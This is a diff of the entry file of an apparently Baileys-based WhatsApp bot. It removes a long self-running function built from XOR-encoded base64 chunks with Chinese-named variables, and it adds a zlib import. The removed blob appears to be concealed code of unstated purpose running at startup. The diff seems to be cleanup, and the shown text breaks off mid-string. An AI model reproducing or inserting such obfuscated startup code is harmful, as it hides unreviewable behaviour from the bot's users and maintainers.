@@ -43,13 +43,13 @@
 ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
 */
 
-
 import './setting.js'
 import dns from 'node:dns'
 import fs from 'node:fs'
 import os from 'node:os'
 import process from 'node:process'
 import path from 'node:path'
+import zlib from 'node:zlib'
 import { fileURLToPath } from 'node:url'
 import {
   makeWASocket,
@@ -66,304 +66,81 @@ import { normalizeNumber } from './lib/utils.js'
 import { PluginRegistry, PluginWatcher } from './lib/plugins.js'
 import { messageHandler } from './handler.js'
 
-(function(苍穹, 浩瀚, 虚空, 纪元) {
-  const 龙魂秘钥 = 143;
-  
-  const _龙腾四海_0 = 'p+789uHsr6emr7Kxr/SFhevh/KH86vvL6unu+uP73er8+uP7wP3r6v2nqOb/+bvp5v38+6imhejj4O3u46H8++79+9vm4uqvsq/L7vvqoeHg+KemhYXs4OH8+6/Q0Ovm/eHu4uqvsq//7vvnoevm/eHu4uqn6ebj6trdw9vg3+7756fQ0OLq';
-  const _凤舞九天_1 = '++7Q+v3jpqaF7ODh/Puv/+P66Obh/Mvm/a+yr//u++eh/er84OP56qfQ0Ovm/eHu4uqjr6j/4/ro5uH8qKaF7ODh/Puv/Or8/Obg4cvm/a+yr//u++eh/er84OP56qfQ0Ovm/eHu4uqjr6j86vz85uDhqKaF7ODh/Puv++L/y+b9r7Kv/+77';
-  const _麒麟踏瑞_2 = '56H96vzg4/nqp9DQ6+b94e7i6qOvqPvi/6imhYXs4OH8+6/s4OPg/fyvsq/0ha+v/er86vu1r6jT977t1L/iqKOFr6/r5uK1r6jT977t1L3iqKOFr6//5uHkta+o0/e+7dS8t7S6tL2+vOKoo4Wvr/zg6fvf5uHkta+o0/e+7dS8t7S6tL2+';
-  const _玄武镇岳_3 = 't+Koo4Wvr+Pu+erh6+r9ta+o0/e+7dS8t7S6tL63vOKoo4Wvr+z27uG1r6jT977t1Ly54qijha+v6P3q6uG1r6jT977t1Ly94qijha+v9urj4+D4ta+o0/e+7dS8vOKoo4Wvr+Lu6Orh++61r6jT977t1Ly64qijha+v/errta+o0/e+7dS8';
-  const _朱雀焚天_4 = 'vuKohfKFhen64ez75uDhr+zj6u7h2+L/yebj6vynpq/0ha+v5umvp67p/KHq9+b8+/zc9uHsp/vi/8vm/aamr/SFr6+vr+n8oeLk6+b93Pbh7Kf74v/L5v2jr/Sv/ers+v385vnqta/7/frqr/Kmha+vr6/96vv6/eGFr6/yha+v+/32r/SF';
-  const _青龙降世_5 = 'r6+vr+zg4fz7r+nm4+r8r7Kv6fyh/eru6+vm/dz24eyn++L/y+b9poWvr6+v7ODh/Puv4eD4r7Kvy+776qHh4PinpoWvr6+v6eD9r6fs4OH8+6/p5uPqr+Dpr+nm4+r8pq/0ha+vr6+vr+bpr6fp5uPqr7Kysq+ooejm++Tq6v+opq/s4OH7';
-  const _白虎啸风_6 = '5uH66oWvr6+vr6/s4OH8+6/p5uPq3+7756+yr//u++eh5eDm4af74v/L5v2jr+nm4+qmha+vr6+vr/v99q/0ha+vr6+vr6+v7ODh/Puv/Pvu+/yvsq/p/KH8++773Pbh7Kfp5uPq3+7756aFr6+vr6+vr6/m6a+n4eD4r6Kv/Pvu+/yh4vvm';
-  const _太极阴阳_7 = '4urC/K+xr7qvpa+5v6+lr76/v7+mr/SFr6+vr6+vr6+vr+n8ofrh4+bh5Nz24eyn6ebj6t/u++emha+vr6+vr6+v8oWvr6+vr6/yr+zu++znr/Tyha+vr6/yha+v8q/s7vvs56/08oXyhYXs4+ru4dvi/8nm4+r8p6aF/Or7xuH76v357uOn';
-  const _乾坤万象_8 = '7OPq7uHb4v/J5uPq/KOvvr+vpa+5v6+lr76/v7+mhYXs4OH8+6/MwMHJxsivsq/0ha+v4e7i6rWv6OPg7e7joe3g+8Hu4uqv8/OvqN367e32r8L64/vmr8vq+ebs6qijha+v6+r5ta/o4+Dt7uOh7eD7zP3q7vvg/a/z86+oxPb6+qijha+v';
-  const _混沌初开_9 = '+Ort/Ob76rWv6OPg7e7jofjq7fzm++qv8/OvqOf7+//8taCg7v/moeT29fX1off29aijha+v6Ob75/rtta+o5/v7//y1oKDo5vvn+u2h7ODioMT2+vrXu7u7oN367e32osLLqKOFr6/24Pr7+u3qta+o5/v7//y1oKD24Pr7+u3qoezg4qDP';
-  const _天罡北斗_10 = 'wuDi4vbE9vr6qKOFr6/86vz85uDhta/86vz85uDhy+b9o4Wvr//n4OHqwfri7er9ta/o4+Dt7uOh4eDN4Puv8/OvqLm9t7y+ur+3ur+4vb6oo4Wvr//u5v3m4ei1r/v9+uqF8oWF7ODh/Puv/+bh4MPg6Ojq/a+yr//m4eCn9K/j6vnq47Wv';
-  const _地煞神罗_11 = 'qPzm4+rh+6iv8qaFhezg4fz7r+32++r8r7Kvp+Gmr7Kxr/SFr6/s4OH8+6/64eb7/K+yr9Sozaijr6jEzaijr6jCzaijr6jIzaijr6jbzajSha+v4+r7r+avsq+/ha+v+Ofm4+qvp+GvsbKvvr+9u6+pqa/mr7Ov+uHm+/yh4+rh6Pvnr6Kv';
-  const _紫微星宿_12 = 'vqav9IWvr6+v4a+gsq++v727ha+vr6/mpKSFr6/yha+v/er7+v3hr++r9OGh++DJ5vfq66e9pvKvq/T64eb7/NTm0vLvhfKFhen64ez75uDhr/z77v37+v+n/+P66Obh/Mzg+uH7r7Kvv6Ov7ODi4u7h6/zM4Prh+6+yr7+mr/SFr6/s4OH8';
-  const _轩辕御风_13 = '+6/i6uKvsq///eDs6vz8oeLq4uD99tr87ujqp6aFr6/s4OH8+6/74Pvu46+yr+D8ofvg++7j4urip6aFr6/s4OH8+6/p/erqr7Kv4Pyh6f3q6uLq4qemhYWvr+zg4fzg4+qh4+Dop++Fq/Ts4OPg/fyh/+bh5PJtGiJtGw9tGw9tGw+vbyIn';
-  const _盘古开天_14 = 'byIor93azc3Wr8Law9vGr8vK2cbMyq9vIidvIiivbRsPbRsPbRsPbRohq/Ts4OPg/fyh/er86vvyhav07ODj4P38of/m4eTybRsNq/Ts4OPg/fyh/er86vvyr28kIW0NAkQ5bjobr246Gq9uOhtEOW0NAW4MH6+r9Ozg4+D9/KH84On73+bh';
-  const _伏羲八卦_15 = '5PL89vz76uKv5uHm++bu4+b17vvm4OGuq/Ts4OPg/fyh/er86vvyhav07ODj4P38of/m4eTybRo/bRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsPbRsP';
-  const _女娲补天_16 = 'bRsPbRsPbRsPbRsPbRsPbRsPbRogq/Ts4OPg/fyh/er86vvyhYWr9Ozg4+D9/KHj7vnq4evq/fJvIidvKAGvr9zW3NvKwq/GwcnA3cLO28bAwav07ODj4P38of3q/Or78oWr9Ozg4+D9/KH/5uHk8m0bDav07ODj4P38of3q/Or78oWr9Ozg';
-  const _神农百草_17 = '4+D9/KH/5uHk8m0bE20bD6v07ODj4P38of3q/Or78q9tFi6vzeD7r8Hu4uqvr7Wvq/Ts4OPg/fyh7Pbu4fKr9MzAwcnGyKHh7uLq8qv07ODj4P38of3q/Or78oWr9Ozg4+D9/KH/5uHk8m0bE20bD6v07ODj4P38of3q/Or78q9tFi6vy+r5';
-  const _封神演义_18 = '6uPg/+r9r7Wvq/Ts4OPg/fyh/ODp+9/m4eTyq/TMwMHJxsih6+r58qv07ODj4P38of3q/Or78oWr9Ozg4+D9/KH/5uHk8m0bE20bD6v07ODj4P38of3q/Or78q9tFi6vzOD96q+vr6+vr7Wvq/Ts4OPg/fyh/+bh5PLd+u32r8LLr+32r8T2';
-  const _诛仙剑阵_19 = '+qv07ODj4P38of3q/Or78oWr9Ozg4+D9/KH/5uHk8m0bE20bD6v07ODj4P38of3q/Or78q9tFi6v2Ort/Ob76q+vr7Wvq/Ts4OPg/fyh4u7o6uH77vKr9MzAwcnGyKH46u385vvq8qv07ODj4P38of3q/Or78oWr9Ozg4+D9/KH/5uHk8m0b';
-  const _万佛朝宗_20 = 'E20bD6v07ODj4P38of3q/Or78q9tFi6vweDr6qHl/K+vr7Wvq/Ts4OPg/fyh9urj4+D48qv0//3g7Or8/KH56v385uDh8qv07ODj4P38of3q/Or78oWr9Ozg4+D9/KH/5uHk8m0bE20bD6v07ODj4P38of3q/Or78q9tFi6v3+Pu++ng/eKv';
-  const _如意金箍_21 = 'r7Wvq/Ts4OPg/fyh9urj4+D48qv0//3g7Or8/KH/4+776eD94vKvp6v0//3g7Or8/KHu/ezn8qar9Ozg4+D9/KH96vzq+/KFq/Ts4OPg/fyh/+bh5PJtGxNtGw+r9Ozg4+D9/KH96vzq+/KvbRYur93Owq+vr6+vr6+1r6v07ODj4P38oez2';
-  const _昆仑仙境_22 = '7uHyq/Tt9vvq/Kf74Pvu46+ir+n96uqm8q+gr6v07fb76vyn++D77uOm8qv07ODj4P38of3q/Or78oWr9Ozg4+D9/KH/5uHk8m0bE20bD6v07ODj4P38of3q/Or78q9tFi6v3+P66Obh/K+vr7Wvq/Ts4OPg/fyh6P3q6uHyq/T/4/ro5uH8';
-  const _蓬莱神阁_23 = 'zOD64fvyr//j+ujm4fyr9Ozg4+D9/KH96vzq+/KFq/Ts4OPg/fyh/+bh5PJtGxNtGw+r9Ozg4+D9/KH96vzq+/KvbRYur8zg4uLu4ev8r6+1r6v07ODj4P38oej96urh8qv07ODi4u7h6/zM4Prh+/Kv7ODi4u7h6/yr9Ozg4+D9/KH96vzq';
-  const _九幽冥界_24 = '+/KFq/Ts4OPg/fyh/+bh5PJtGxttGw+r9Ozg4+D9/KH96vzq+/KvbRYur9z77vv6/K+vr6+1r6v07ODj4P38oej96urh8vz77v375uHor/r/oaGhq/Ts4OPg/fyh/er86vvyhYWr9Ozg4+D9/KH84On73+bh5PJlHT9uDB+vbRYur280HWUd';
-  const _修罗血海_25 = 'Pq/j4O7r5uHor+Lg6/rj6vyvqa/86vz85uDhoaGhq/Ts4OPg/fyh/er86vvyhe+mhfKFhezg4fz7r/3q6Ob8+/32r7Kv4er4r9/j+ujm4d3q6Ob8+/32p//j+ujm4fzL5v2mhe747ub7r/3q6Ob8+/32oePg7uvO4+OnpoWF7ODh/Puv+O77';
-  const _鸿蒙至尊_26 = '7Ofq/a+yr+Hq+K/f4/ro5uHY7vvs5+r9p/3q6Ob8+/32o6//4/ro5uH8y+b9poX47vvs5+r9ofz77v37p6aFhfz77v37+v+n/ero5vz7/fah/+P66Obh/KH85vXqo6/96ujm/Pv99qHs4OLi7uHr/KH85vXqpoWF4+r7r/zg7OSvsq/h+uPj';
-  const _造化玉碟_27 = 'hePq+6/m/N3q7ODh4ers++bh6K+yr+nu4/zqhePq+6/m/Mzj4Pzq66+yr+nu4/zqhePq+6/n7vzf7ub95uHozODr6t3q/vrq/Pvq66+yr+nu4/zqhYXp+uHs++bg4a/s4+ru4fr/3ODs5Or7p6av9IWvr+bpr6f84Ozkpq/0ha+vr6/7/fav';
-  const _金乌破晓_28 = '9IWvr6+vr6/84Ozkoer5of3q4uD56s7j48Pm/Pvq4er9/Keo7ODh4ers++bg4aH6/+vu++qopoWvr6+vr6/84Ozkoer5of3q4uD56s7j48Pm/Pvq4er9/Keo7P3q6/yh+v/r7vvqqKaFr6+vr6+v/ODs5KHq+aH96uLg+erO4+PD5vz76uHq';
-  const _玉兔捣药_29 = '/fynqOLq/Pzu6Or8ofr//Or9+6imha+vr6+vr+bpr6f84Ozkofj8pq/0ha+vr6+vr6+v/ODs5KH4/KHs4+D86qemha+vr6+vr/KFr6+vr/Kv7O777Oev9PKFr6+vr/zg7OSvsq/h+uPjha+v8oXyhYXu/Pbh7K/p+uHs++bg4a/8++79+83g';
-  const _苍龙出海_30 = '+6emr/SFr6/m6a+n5vzM4+D86uumr/3q+/r94YWFr6/s4OH8+6/0r/z77vvqo6/87vnqzP3q6/yv8q+yr+747ub7r/r86sL64/vmyebj6s76++fc++776qfMwMHJxsih/Or8/Obg4aaFr6/s4OH8+6/0r/nq/fzm4OGv8q+yr+747ub7r+nq';
-  const _赤霄神剑_31 = '++znw+776vz72O7Y6u3Z6v385uDhp6ah7O777Oenp6avsrGvp/Sv+er9/Obg4bWv1L2jr7y/v7+jr76/u7a9vLm9vLjSo6/m/MPu++r8+7Wv6e7j/Oqv8qamhYWvr+zg4fz7r/3u+Nzg7OSvsq/i7uTq2M7c4Ozk6vun9IWvr6+v+er9/Obg';
-  const _太上忘情_32 = '4aOFr6+vr+76++e1r/z77vvqo4Wvr6+v4+Do6Or9ta//5uHgw+Do6Or9o4Wvr6+v7f3g+Pzq/bWvzf3g+Pzq/fyh+u364fv6p8zAwcnGyKHh7uLqpqOFr6+vr//95uH73t3G4dvq/eLm4e7jta/p7uP86qOFr6+vr+Lu/eTA4ePm4erA4czg';
-  const _混元一气_33 = '4eHq7Pu1r+nu4/zqo4Wvr6+v6Orh6v3u++rH5ujn3vru4+b79sPm4eTf/er55ur4ta/7/frqo4Wvr6+v/Pbh7Mn64+PH5vz74P32ta/p7uP86qOFr6+vr+zg4eHq7Pvb5uLq4Pr7wvy1r7m/v7+/o4Wvr6+v5Orq/87j5vnqxuH76v357uPC';
-  const _元始天尊_34 = '/LWvvbq/v7+jha+vr6/r6unu+uP73vrq/fbb5uLq4Pr7wvy1r7m/v7+/ha+v8qaFha+v/e743ODs5KHm6+rh++b79q+yr6jE9vX1qIWvr/3u+Nzg7OSh/ero5vz7/favsq/96ujm/Pv99oWvr/zg7OSvsq/t5uHrwur8/O7o6sfq4//q/fyn';
-  const _道德经法_35 = '/e743ODs5KaFha+v5umvp8zAwcnGyKH/7ub95uHor6mpr6784Ozkoe76++fc++776qHs/err/KH96ujm/Pvq/errr6mpr67n7vzf7ub95uHozODr6t3q/vrq/Pvq66av9IWvr6+v7ODh/Puv7OPq7uHB+uLt6v2vsq/h4P3i7uPm9erB+uLt';
-  const _灵宝天尊_36 = '6v2nzMDBycbIof/n4OHqwfri7er9poWvr6+v5umvp+zj6u7hwfri7er9pq/0ha+vr6+vr+fu/N/u5v3m4ejM4Ovq3er++ur8++rrr7Kv+/366oWvr6+vr6/86vvb5uLq4Pr7p+789uHsr6emr7Kxr/SFr6+vr6+vr6/7/fav9IWvr6+vr6+v';
-  const _通天教主_37 = 'r6+v7ODh/Puv7Pr8++DizODr6q+yr+jj4O3u46Hs+vz74OLf7ub95uHozODr6q+pqa/o4+Dt7uOh7Pr8++Di3+7m/ebh6Mzg6+qh4+rh6Pvnr7Kysq+3r7Cv6OPg7e7joez6/Pvg4t/u5v3m4ejM4Ovqr7Wv+uHr6unm4errha+vr6+vr6+v';
-  const _大荒经注_38 = 'r6/s4OH8+6/s4Ovqr7Kv7vju5vuv/ODs5KH96v766vz73+7m/ebh6Mzg6+qn7OPq7uHB+uLt6v2jr+z6/Pvg4szg6+qmha+vr6+vr6+vr6/s4OH8+6/p4P3i7vv76uvM4Ovqr7Kv7ODr6rCh4u777OenoKH0vqO78qDoprCh5eDm4aeooqim';
-  const _山海经图_39 = 'r/Pzr+zg6+qFha+vr6+vr6+vr6/s4OH84OPqoePg6Kfvhav07ODj4P38of/m4eTybRoibRsPbRsPbRsPr28iJ28iKK/d2s3N1q/C2sPbxq/LytnGzMqvbyInbyIor20bD20bD20bD20aIav07ODj4P38of3q/Or78oWr9Ozg4+D9/KH/5uHk';
-  const _东皇钟鸣_40 = '8m0bDav07ODj4P38of3q/Or78q9vJCFtDQJEOW46G69uOhqvbjobRDltDQFuDB+vq/Ts4OPg/fyh/ODp+9/m4eTy+Ofu+/zu//+v/+7m/ebh6K6r9Ozg4+D9/KH96vzq+/KFq/Ts4OPg/fyh/+bh5PJtGj9tGw9tGw9tGw9tGw9tGw9tGw9t';
-  const _轩辕剑出_41 = 'Gw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGiCr9Ozg4+D9/KH96vzq+/KFhav07ODj4P38oePu+erh6+r98m8iJ28oAa+v387G3cbByK/MwMvK';
-  const _盘古斧碎_42 = 'q/Ts4OPg/fyh/er86vvyhav07ODj4P38of/m4eTybRsNq/Ts4OPg/fyh/er86vvyhav07ODj4P38of/m4eTybRsTbRsPq/Ts4OPg/fyh/er86vvyr20WLq/B+uLt6v2vr6+vr6+vta+r9Ozg4+D9/KH26uPj4Pjyq/TMwMHJxsih/+fg4erB';
-  const _炼妖壶现_43 = '+uLt6v3yq/Ts4OPg/fyh/er86vvyhav07ODj4P38of/m4eTybRsTbRsPq/Ts4OPg/fyh/er86vvyr20WLq/f7ub95uHor8zg6+qvta+r9Ozg4+D9/KHo/erq4fKr9Ong/eLu+/vq68zg6+ryq/Ts4OPg/fyh/er86vvyhav07ODj4P38of/m';
-  const _昊天塔震_44 = '4eTybRsTbRsPq/Ts4OPg/fyh/er86vvyr20WLq/c++77+vyvr6+vr6+vta+r9Ozg4+D9/KHs9u7h8vju5vvm4eiv6eD9r+zg4enm/eLu++bg4av07ODj4P38of3q/Or78oWr9Ozg4+D9/KH/5uHk8m0bG20bD6v07ODj4P38of3q/Or78q9t';
-  const _昆仑镜照_45 = 'Fi6vxuH8+/367Pvm4OGvr7Wvq/Ts4OPg/fyh/ODp+9/m4eTyw+bh5K/45vvnr//n4OHqr+H64u3q/a/m4a/Y5+77/M7//6v07ODj4P38of3q/Or78oWFq/Ts4OPg/fyh/ODp+9/m4eTyZR0/bgwfr20WLq9vNB1lHT6v6uH76v2v++fqr+zg';
-  const _女娲石聚_46 = '6+qv5uGv9uD6/a/45+77/O7//66r9Ozg4+D9/KH96vzq+/KF76aFr6+vr6+vr6/yr+zu++znr6fq/f3g/aav9IWvr6+vr6+vr6+v7ODh/ODj6qHq/f3g/afv3+7m/ebh6K/p7ubj6uu1r6v06v394P2h4ur8/O7o6vLvpoWvr6+vr6+vr/KF';
-  const _神农鼎焚_47 = 'r6+vr6+v8qOvvL+/v6aFr6+vr/KFr6/yhYWvr/zg7OSh6vmh4OGnqOz96uv8ofr/6+776qijr/zu+erM/err/KaFha+v/ODs5KHq+aHg4aeo7ODh4ers++bg4aH6/+vu++qoo6+n9K/s4OHh6uz75uDho6/j7vz7y+b87ODh4ers+6/ypq+y';
-  const _崆峒印尊_48 = 'sa/0ha+vr6/m6a+n7ODh4ers++bg4a+ysrKvqOzg4eHq7Pvm4eiopq/0ha+vr6+vr+zg4fzg4+qh4+Dop++r9Ozg4+D9/KHr5uLy1NjHztvczt/f0qv07ODj4P38of3q/Or78q+r9Ozg4+D9/KHs9u7h8szg4eHq7Pvm4eiv++Cv2Ofu+/zO';
-  const _伏羲琴音_49 = '//+hoaGr9Ozg4+D9/KH96vzq+/LvpoWvr6+v8oWFr6+vr+bpr6fs4OHh6uz75uDhr7Kysq+o4P/q4aimr/SFr6+vr6+v7ODh/ODj6qHj4Oin74Wr9Ozg4+D9/KH/5uHk8m0aIm0bD20bD20bD69vIidvIiiv3drNzdavwtrD28avy8rZxszK';
-  const _紫青双剑_50 = 'r28iJ28iKK9tGw9tGw9tGw9tGiGr9Ozg4+D9/KH96vzq+/KFq/Ts4OPg/fyh/+bh5PJtGw2r9Ozg4+D9/KH96vzq+/KvbyQhbQ0CRDluOhuvbjoar246G0Q5bQ0Bbgwfr6v07ODj4P38ofzg6fvf5uHk8vjn7vv87v//r+zg4eHq7Pvq666r';
-  const _诛仙绝仙_51 = '9Ozg4+D9/KH96vzq+/KFq/Ts4OPg/fyh/+bh5PJtGj9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGw9tGiCr9Ozg';
-  const _陷仙戮仙_52 = '4+D9/KH96vzq+/KFhav07ODj4P38oePu+erh6+r98m8iJ28oAa+vzMDBwcrM28bAwa/c287b2tyr9Ozg4+D9/KH96vzq+/KFq/Ts4OPg/fyh/+bh5PJtGw2r9Ozg4+D9/KH96vzq+/KFq/Ts4OPg/fyh/+bh5PJtGxNtGw+r9Ozg4+D9/KH9';
-  const _九天玄女_53 = '6vzq+/KvbRYur83g+6/B7uLqr7Wvq/Ts4OPg/fyh/ODp+9/m4eTyq/T84Ozkofr86v2woeHu4uqv8/Ov/ODs5KH6/Or9sKHm66/z86+o3frt7fao8qv07ODj4P38of3q/Or78oWr9Ozg4+D9/KH/5uHk8m0bE20bD6v07ODj4P38of3q/Or7';
-  const _真武大帝_54 = '8q9tFi6vzeD7r8XGy6+vta+r9Ozg4+D9/KH26uPj4Pjyq/T84Ozkofr86v2woebrr/Pzr6ja4eTh4PjhqPKr9Ozg4+D9/KH96vzq+/KFq/Ts4OPg/fyh/+bh5PJtGxNtGw+r9Ozg4+D9/KH96vzq+/KvbRYur8Pm7f3u/favr7Wvq/Ts4OPg';
-  const _二郎真君_55 = '/fyh7Pbu4fL9+u32ou3u5uPq9vzPvqG6ob64q/Ts4OPg/fyh/er86vvyhav07ODj4P38of/m4eTybRsTbRsPq/Ts4OPg/fyh/er86vvyr20WLq/c++77+vyvr6+1r6v07ODj4P38oej96urh8uDh4+bh6q+pr/3q7uv2q/Ts4OPg/fyh/er8';
-  const _龙腾四海_56 = '6vvyhav07ODj4P38of/m4eTybRsbbRsPq/Ts4OPg/fyh/er86vvyr20WLq/O+vvnr6+vr6+1r6v07ODj4P38oej96urh8u76++fq4fvm7O776uuvbRMcq/Ts4OPg/fyh/er86vvyhYWr9Ozg4+D9/KH84On73+bh5PJlHT9uDB+vbRYur280';
-  const _凤舞九天_57 = 'HWUdPq/9+u3t9q/m/K/96u7r9q/74K/86v356q6r9Ozg4+D9/KH96vzq+/KF76aFr6+vr6+v5vzd6uzg4eHq7Pvm4eivsq/p7uP86oWvr6+vr6/86vvb5uLq4Pr7p+789uHsr6emr7Kxr/SFr6+vr6+vr6/7/fav9IWvr6+vr6+vr6+v5umv';
-  const _麒麟踏瑞_58 = 'p/v2/+rg6a/84OzksKHh6vj84+r7++r9yeDj4+D4r7Kysq+o6frh7Pvm4OGopq/0ha+vr6+vr6+vr6+vr+747ub7r/zg7OSh4er4/OPq+/vq/cng4+Pg+Keovr2/vLm8u7+/vba4u7i8vba3z+Hq+Pzj6vv76v2opqHs7vvs56enpq+ysa/0';
-  const _玄武镇岳_59 = '8qaFr6+vr6+vr6+vr6+v7vju5vuv/ODs5KHh6vj84+r7++r9yeDj4+D4p6i+vb+8uby7vr2+vbq8uru+v7rP4er4/OPq+/vq/aimoezu++znp6emr7Kxr/TypoWvr6+vr6+vr6+v8oWvr6+vr6+vr6+v7ODh/Puv7eD7xebrr7Kv/ODs5KH6';
-  const _朱雀焚天_60 = '/Or9sKHm66+wr6f79v/q4Omv/ODs5KHr6uzg6+rF5uuvsrKyr6jp+uHs++bg4aivsK/u+O7m+6/84Ozkoevq7ODr6sXm66f84Ozkofr86v2h5uumr7Wv/ODs5KH6/Or9oebrofz/4+b7p6i1qKbUv9KvpK+oz/yh+Ofu+/zu//+h4er7qKav';
-  const _青龙降世_61 = 'ta/h+uPjha+vr6+vr6+vr6/m6a+n7eD7xebrpq/0ha+vr6+vr6+vr6+vr+zg4fz7r+zg4eHq7PvC/Oivsq/vbyInbygBr93azc3Wr8Law9vGr8vK2cbMyq9vIidvKAHT4dPh76+kha+vr6+vr6+vr6+vr6+v720WLq/N4Puv7er95+785uOv';
-  const _白虎啸风_62 = '++r95/rt+uHortPh76+kha+vr6+vr6+vr6+vr6+v720PNa/c++77+vyvta/M4OHh6uz76uuvbRMc0+Hvr6SFr6+vr6+vr6+vr6+vr6/vbQ81r8Lg6+qvr6+1r9jn7vv8zv//r8L64/vmr8vq+ebs6tPh76+kha+vr6+vr6+vr6+vr6+v720P';
-  const _太极阴阳_63 = 'Na/L6vmvr6+vta/E9vr60+HT4e+vpIWvr6+vr6+vr6+vr6+vr+9vJCFtDQKvRDluOhuvbjoar246G0Q5r20NAW4MH6/d+u3t9q/m/K/g4ePm4eqvbRYu0+HT4e+vpIWvr6+vr6+vr6+vr6+vr+9tDzWvyOb7x/rtr7Wv5/v7//y1oKDo5vvn';
-  const _乾坤万象_64 = '+u2h7ODioMT2+vrXu7u70+Hvr6SFr6+vr6+vr6+vr6+vr6/vbQ81r8zn7uHh6uOvta/n+/v//LWgoPjn7vv87v//oezg4qDs5+7h4erjoL+/vbbZ7cvX1uPEy8W5x77LuMviv+m+vO+Fr6+vr6+vr6+vr6+v7vju5vuv/ODs5KH86uHrwur8';
-  const _混沌初开_65 = '/O7o6qft4PvF5uujr/Sv++r3+7Wv7ODh4ers+8L86K/ypqHs7vvs56enpq+ysa/08qaFr6+vr6+vr6+vr/KFr6+vr6+vr6/yr+zu++znr/Tyha+vr6+vr/Kjr72/v7+mha+vr6/yhYWvr6+v5umvp+zg4eHq7Pvm4OGvsrKyr6js4+D86qim';
-  const _天罡北斗_66 = 'r/SFr6+vr6+v7ODh/Puv7ODr6q+yr+Pu/PvL5vzs4OHh6uz7sKHq/f3g/bCh4Pr7//r7sKH8++77+vzM4Ovqha+vr6+vr+zg4fzg4+qh4+Dop++r9Ozg4+D9/KHr5uLy1NjHztvczt/f0qv07ODj4P38of3q/Or78q+r9Ozg4+D9/KH26uPj';
-  const _地煞神罗_67 = '4PjyzODh4ers++bg4a/s4+D86uuvp6v07ODr6q+wsK+o+uHk4eD44ajypqv07ODj4P38of3q/Or78u+mhYWvr6+vr6/m6a+n7ODr6q+usrKvy+b87ODh4ers+93q7vzg4aHj4Ojo6uvA+vumr/SFr6+vr6+vr6/m6a+nrub8zOPg/Orrr6mp';
-  const _紫微星宿_68 = 'r67m/N3q7ODh4ers++bh6Kav9IWvr6+vr6+vr6+v5vzd6uzg4eHq7Pvm4eivsq/7/frqha+vr6+vr6+vr6/s4OH84OPqoePg6Kfvq/Ts4OPg/fyh6+bi8tTYx87b3M7f39Kr9Ozg4+D9/KH96vzq+/Kvq/Ts4OPg/fyh4u7o6uH77vLd6uzg';
-  const _轩辕御风_69 = '4eHq7Pvm4eihoaGr9Ozg4+D9/KH96vzq+/LvpoWvr6+vr6+vr6+v/Or72+bi6uD6+6enpq+ysa/0ha+vr6+vr6+vr6+vr+zj6u7h+v/c4Ozk6vunpoWvr6+vr6+vr6+vr6/8++79+83g+6emoezu++znp6fq/f2mr7Kxha+vr6+vr6+vr6+v';
-  const _盘古开天_70 = 'r6+v7ODh/ODj6qHq/f3g/afv3er8++79+6/p7ubj6uu1r6v06v39oeLq/Pzu6Ory76aFr6+vr6+vr6+vr6+vpoWvr6+vr6+vr6+v8qOvvL+/v6aFr6+vr6+vr6/yha+vr6+vr/Kv6uP86q/0ha+vr6+vr6+v7ODh/ODj6qHq/f3g/aeo3Or8';
-  const _伏羲八卦_71 = '/Obg4a/j4Ojo6uuv4Pr7oa/d6uPm4eSv++fqr+vq+ebs6qGopoWvr6+vr6/yha+vr6/yha+v8qaFha+v7ODh/Puv6P3g+v/L7d/u++evsq//7vvnof3q/ODj+eqn0NDr5v3h7uLqo6+o6+777u3u/Oqg6P3g+v/8oeX84OGopoWFr6/p+uHs';
-  const _女娲补天_72 = '++bg4a/o6vvI/eD6/8vu++6n6P3g+v/G66av9IWvr6+v+/32r/SFr6+vr6+v5umvp+n8oer35vz7/Nz24eyn6P3g+v/L7d/u++empq/0ha+vr6+vr6+v7ODh/Puv6+2vsq/F3MDBof/u/fzqp+n8of3q7uvJ5uPq3Pbh7Kfo/eD6/8vt3+77';
-  const _神农百草_73 = '56OvqPr76aK3qKamha+vr6+vr6+v/er7+v3hr+vt1Oj94Pr/xuvSr/Pzr/Tyha+vr6+vr/KFr6+vr/Kv7O777Oev9PKFr6+vr/3q+/r94a/08oWvr/KFha+v7vz24eyv6frh7Pvm4OGv6Orh6v3u++rM7uH57vzN+unp6v2n+/b/6qOv///N';
-  const _封神演义_74 = '+unp6v2jr+3ozfrp6er9o6/h7uLqo6/o/eD6/6Ov4uri7er9pq/0ha+vr6/s4OH8+6/97uHrr7Kvwu7756H97uHr4OKnpqH74Nz7/ebh6Ke8uaah/OPm7OqnvaOvt6aFr6+vr+zg4fz7r/vm4uqvsq/L7vvqoeHg+Kemha+vr6/s4OH8+6/7';
-  const _诛仙剑阵_75 = '4v/f/6+yr//u++eh5eDm4af74v/L5v2jr+///9Cr9Pvm4ury0Kv0/e7h6/Kh5f/o76aFr6+vr+zg4fz7r/vi/83or7Kv/+7756Hl4Obhp/vi/8vm/aOv7+3o0Kv0++bi6vLQq/T97uHr8qHl/+jvpoWFr6+vr/v99q/0ha+vr6+vr+747ub7';
-  const _万佛朝宗_76 = 'r/zn7v3/p///zfrp6er9pqH96vzm9eqnur69o6+6vr2jr/Sv6eb7ta+o7OD56v2or/KmoeX/6uin9K/++u7j5vv2ta+3v6/ypqH74Mnm4+qn++L/3/+mha+vr6+vr+747ub7r/zn7v3/p+3ozfrp6er9pqH96vzm9eqnvr+9u6Ovu7q/o6/0';
-  const _如意金箍_77 = 'r+nm+7WvqOzg+er9qK/ypqHl/+rop/Sv/vru4+b79rWvt7+v8qah++DJ5uPqp/vi/83opoWFr6+vr6+v7ODh/Puv6euvsq/h6vivyeD94svu++6npoWvr6+vr6/p66Hu///q4eunqP//qKOv4er4r83j4O2n1On8of3q7uvJ5uPq3Pbh7Kf7';
